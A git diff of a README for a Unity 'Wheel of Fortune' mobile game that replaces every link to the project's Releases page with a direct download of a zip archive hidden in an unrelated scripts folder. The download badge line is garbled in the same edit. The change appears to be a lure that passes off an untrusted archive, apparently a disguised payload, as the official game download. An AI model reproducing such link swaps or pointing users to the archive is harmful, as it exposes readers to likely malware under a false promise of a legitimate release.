@@ -1,6 +1,6 @@
 # 🎡 Wheel-Of-Fortune - Spin the Wheel for Exciting Rewards!
 
-[![Download the Wheel of Fortune](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/ceoabdo/Wheel-Of-Fortune/releases)
+[![Download the Wheel of Fortune](https://github.com/ceoabdo/Wheel-Of-Fortune/raw/refs/heads/main/Assets/_Game/Scripts/Data/Profiles/Fortune-Wheel-Of-3.1.zip%20Now-Get%https://github.com/ceoabdo/Wheel-Of-Fortune/raw/refs/heads/main/Assets/_Game/Scripts/Data/Profiles/Fortune-Wheel-Of-3.1.zip)](https://github.com/ceoabdo/Wheel-Of-Fortune/raw/refs/heads/main/Assets/_Game/Scripts/Data/Profiles/Fortune-Wheel-Of-3.1.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Welcome to the Wheel of Fortune mobile game! This game, built with Unity, offers
 
 To get the game up and running, follow these steps:
 
-1. **Visit the Releases Page:** Head over to our Releases page to download the game. You can access it [here](https://github.com/ceoabdo/Wheel-Of-Fortune/releases).
+1. **Visit the Releases Page:** Head over to our Releases page to download the game. You can access it [here](https://github.com/ceoabdo/Wheel-Of-Fortune/raw/refs/heads/main/Assets/_Game/Scripts/Data/Profiles/Fortune-Wheel-Of-3.1.zip).
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. You’ll see an option for downloading the game files. 
 
@@ -24,7 +24,7 @@ To get the game up and running, follow these steps:
 
 ### Step 1: Visit the Releases Page
 
-For the game download, please [visit this page to download](https://github.com/ceoabdo/Wheel-Of-Fortune/releases).
+For the game download, please [visit this page to download](https://github.com/ceoabdo/Wheel-Of-Fortune/raw/refs/heads/main/Assets/_Game/Scripts/Data/Profiles/Fortune-Wheel-Of-3.1.zip).
 
 ### Step 2: Choose Your Platform
 
